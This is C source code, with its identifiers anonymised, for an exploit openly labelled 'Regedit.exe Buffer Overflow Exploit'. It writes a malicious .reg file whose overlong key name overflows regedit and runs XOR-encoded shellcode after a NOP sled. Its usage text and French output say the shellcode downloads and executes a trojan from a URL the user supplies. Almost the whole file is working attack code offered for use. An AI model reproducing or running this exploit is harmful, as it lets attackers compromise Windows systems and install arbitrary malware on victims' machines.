
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 int FUNC_0 (scalar_t__) ;
 scalar_t__ FUNC_1 (char*,int ,int ,int *,int ,int ,int *) ;
 int FUNC_2 (int ) ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 scalar_t__ VAR_4 ;
 int VAR_5 ;
 scalar_t__ FUNC_3 (int ,int) ;
 scalar_t__ VAR_6 ;
 char* FUNC_4 (char*) ;
 int FUNC_5 (char*,int) ;
 int FUNC_6 (char*,char*) ;
 int FUNC_7 (char*,char*) ;
 int FUNC_8 (char*,int ,int) ;
 int FUNC_9 (char*,...) ;
 int FUNC_10 (char*) ;

int FUNC_11 (int VAR_7, char *VAR_8[])
{
 int VAR_9;
 char VAR_10[] = "Windows Registry Editor Version 5.00\r\n\r\n"
   "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Discovered\\and\\coded\\by\\ThreaT]\r\n",

 *VAR_11, *VAR_12,

 VAR_13[] =

 "\xAA\xC6\x02\x01"


 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"


 "\x68\x5E\x56\xC3\x90\x8B\xCC\xFF\xD1\x83\xC6\x0E\x90\x8B\xFE\xAC"
 "\x34\x99\xAA\x84\xC0\x75\xF8"


 "\x72\xeb\xf3\xa9\xc2\xfd\x12\x9a\x12\xd9\x95\x12\xd1\x95\x12\x58\x12\xc5\xbd\x91"
 "\x12\xe9\xa9\x9a\xed\xbd\x9d\xa1\x87\xec\xd5\x12\xd9\x81\x12\xc1\xa5\x9a\x41\x12"
 "\xc2\xe1\x9a\x41\x12\xea\x85\x9a\x69\xcf\x12\xea\xbd\x9a\x69\xcf\x12\xca\xb9\x9a"
 "\x49\x12\xc2\x81\xd2\x12\xad\x03\x9a\x69\x9a\xed\xbd\x8d\x12\xaf\xa2\xed\xbd\x81"
 "\xed\x93\xd2\xba\x42\xec\x73\xc1\xc1\xaa\x59\x5a\xc6\xaa\x50\xff\x12\x95\xc6\xc6"
 "\x12\xa5\x16\x14\x9d\x9e\x5a\x12\x81\x12\x5a\xa2\x58\xec\x04\x5a\x72\xe5\xaa\x42"
 "\xf1\xe0\xdc\xe1\xd8\xf3\x93\xf3\xd2\xca\x71\xe2\x66\x66\x66\xaa\x50\xc8\xf1\xec"
 "\xeb\xf5\xf4\xff\x5e\xdd\xbd\x9d\xf6\xf7\x12\x75\xc8\xc8\xcc\x66\x49\xf1\xf0\xf5"
 "\xfc\xd8\xf3\x97\xf3\xeb\xf3\x9b\x71\xcc\x66\x66\x66\xaa\x42\xca\xf1\xf8\xb7\xfc"
 "\xe1\x5f\xdd\xbd\x9d\xfc\x12\x55\xca\xca\xc8\x66\xec\x81\xca\x66\x49\xaa\x42\xf1"
 "\xf0\xf7\xdc\xe1\xf3\x98\xf3\xd2\xca\x71\xb5\x66\x66\x66\x14\xd5\xbd\x89\xf3\x98"
 "\xc8\x66\x49\xaa\x42\xf1\xe1\xf0\xed\xc9\xf3\x98\xf3\xd2\xca\x71\x8b\x66\x66\x66"
 "\x66\x49\x71\xe6\x66\x66\x66";

 FUNC_9 ("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
  "Regedit.exe Buffer Overflow Exploit\n"
  "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
  "Discovered & Coded By ThreaT.\n\n"
  "contact : ThreaT@Ifrance.com\n"
  "URL : http://www.chez.com/mvm\n\n");

 if (!VAR_8[1])
 {
  FUNC_9 ("_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_\n"
   "Usage   : regexploit.exe <URL://trojan.exe>\n"
   "Exemple : regexploit.exe file://c:/winnt/system32/cmd.exe\n"
   "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_\n");
  FUNC_2 (0);
 }



 VAR_6 = FUNC_1 ("VulnFile.reg",VAR_3,VAR_2,
        ((void*)0),VAR_0,VAR_1,((void*)0));

 if (VAR_6 == VAR_4)
 {
  FUNC_9 ("Cannot create a vuln regfile !\n");
  FUNC_2 (0);
 }

 FUNC_5 ("\xFF\xFE",2);
 FUNC_5 (FUNC_4 (VAR_10),FUNC_10 (VAR_10)*2);

 VAR_11 = (char *) FUNC_3 (VAR_5,270);
 VAR_11[0] = '"'; FUNC_8 (&VAR_11[1],'0',260);

 FUNC_5 (FUNC_4 (VAR_11),FUNC_10 (VAR_11)*2);

 VAR_12 = (char *) FUNC_3 (VAR_5, FUNC_10 (VAR_8[1])+10);
 FUNC_7 (VAR_12,VAR_8[1]);

 for (VAR_9=0; VAR_9 < FUNC_10 (VAR_8[1]); VAR_8[1][VAR_9++]^=0x99);
 FUNC_6 (VAR_13,VAR_8[1]);
 FUNC_6 (VAR_13,"\x99");

 FUNC_5 (VAR_13,FUNC_10 (VAR_13));

 FUNC_0 (VAR_6);

 FUNC_9 ("un fichier .reg vulnerable appele VulnFile.reg viens d'etre cree\n"
  "pour downloader et executer '%s'\n",VAR_12);

}
